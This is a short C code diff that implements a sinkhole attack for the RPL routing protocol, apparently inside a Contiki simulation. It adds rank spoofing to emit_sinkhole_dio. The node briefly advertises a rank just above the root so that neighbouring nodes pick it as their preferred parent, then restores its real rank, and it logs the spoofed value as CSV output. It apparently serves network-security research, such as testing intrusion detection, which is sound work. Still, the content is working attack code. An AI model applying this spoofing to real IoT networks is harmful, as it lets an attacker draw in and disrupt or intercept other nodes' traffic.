@@ -53,6 +53,13 @@
 static uint8_t attack_enabled;
 static uint32_t dio_count;
 
+void
+brpl_parent_switch_callback(rpl_parent_t *old_p, rpl_parent_t *new_p)
+{
+  (void)old_p;
+  (void)new_p;
+}
+
 uint8_t
 sinkhole_attack_is_enabled(void)
 {
@@ -105,16 +112,33 @@ static void
 emit_sinkhole_dio(void)
 {
   rpl_instance_t *instance = rpl_get_default_instance();
+  rpl_dag_t *dag;
+  rpl_rank_t saved_rank;
 
   if(instance == NULL || instance->current_dag == NULL) {
     return;
   }
 
+  dag = instance->current_dag;
+
+  /* Spoof a low rank so nearby nodes elect us as preferred parent.
+   * ROOT_RANK(instance) = instance->min_hoprankinc (typically 256).
+   * SINKHOLE_RANK_DELTA=1 → advertised rank = 257, i.e. one unit
+   * above root, well below our real rank (root + 1 hop = ~512).
+   * We restore the real rank immediately after so that our own
+   * routing decisions are unaffected. */
+  saved_rank = dag->rank;
+  dag->rank  = (rpl_rank_t)(ROOT_RANK(instance) + SINKHOLE_RANK_DELTA);
+
   dio_output(instance, NULL);
+
+  dag->rank = saved_rank;
+
   dio_count++;
-  printf("CSV,SINKHOLE_DIO,%u,%lu\n",
+  printf("CSV,SINKHOLE_DIO,%u,%lu,%u\n",
          (unsigned)linkaddr_node_addr.u8[LINKADDR_SIZE - 1],
-         (unsigned long)dio_count);
+         (unsigned long)dio_count,
+         (unsigned)(ROOT_RANK(instance) + SINKHOLE_RANK_DELTA));
 }
 
 PROCESS(sinkhole_attacker_process, "Sinkhole attacker");
